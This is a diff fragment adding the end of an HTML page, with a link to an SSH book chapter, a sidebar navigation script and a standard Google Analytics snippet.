+<p><a href="https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch11_04.htm" class="bare">https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch11_04.htm</a></p>
+</li>
+</ul>
+</div>
+</div>
+</div></section>
+       </div>
+    </div>
+
+    <script>
+      function openNav() {
+        document.getElementById("sidebar").style.width = "250px";
+        document.getElementById("content").style.marginLeft = "250px";
+      }
+      function closeNav() {
+        document.getElementById("sidebar").removeAttribute("style");
+        document.getElementById("content").removeAttribute("style");
+      } 
+    </script>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
